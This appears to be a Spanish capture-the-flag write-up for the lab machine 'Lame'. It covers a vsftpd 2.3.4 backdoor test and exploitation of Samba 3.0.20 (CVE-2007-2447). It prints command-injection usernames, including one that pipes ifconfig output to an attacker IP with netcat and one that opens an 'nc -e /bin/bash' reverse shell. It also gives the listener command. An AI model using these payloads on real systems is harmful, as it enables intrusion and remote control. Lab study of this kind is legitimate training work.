Índice

  • Rabbit Hole: FTP anónimo y servicios antiguos sin vía útil
  • Explotación: Samba 3.0.20 vulnerable a ejecución remota mediante username map script

Enumeración

Rabbit Hole: FTP (Vulnerable a RCE parcheado)

- Sesión anonymous sin relevancia

- Versión ftp: vsftpd 2.3.4 vulnerable al siguiente exploit

Si nos conectamos con netcat al puerto 21 vulnerable, podemos escribir el comando de la sonrisita :), y se abre el puerto 6200 de la máquina víctima con una shell interactiva

PoC manual con ftp

ftp lame 
ruyztz:)
pass

# Se deberá de abrir una shell en el puerto 6200 de la máquina víctima

PoC manual con netcat

nc lame 21
USER ruyztz:)
PASS pass

# Se deberá de abrir una shell en el puerto 6200 de la máquina víctima

Explotación: samba 3.0.20 (CVE-2007-2447)

Esta vulnerabilidad permite lanzar comandos desde la función SamrChangepassword cuando username map script está habilitado en el archivo smb.conf

El exploit trata de conectarse al servicio samba como el usuario:

# Usuario: "/=`nohup <comando>`"
# nohup se usa para lanzar comandos cuando una consola se muere

Listar recursos compartidos

smbmap -H lame

Conectarnos al share y ejecutar comandos

smbclient //lame/tmp -N
logon "/=`nohup ifconfig | nc 10.10.16.64 443`"
logon "/=`nohup nc -e /bin/bash 10.10.16.64 443`"
# Password: Lo que sea
sudo nc -nlvp 443 # Desde kali
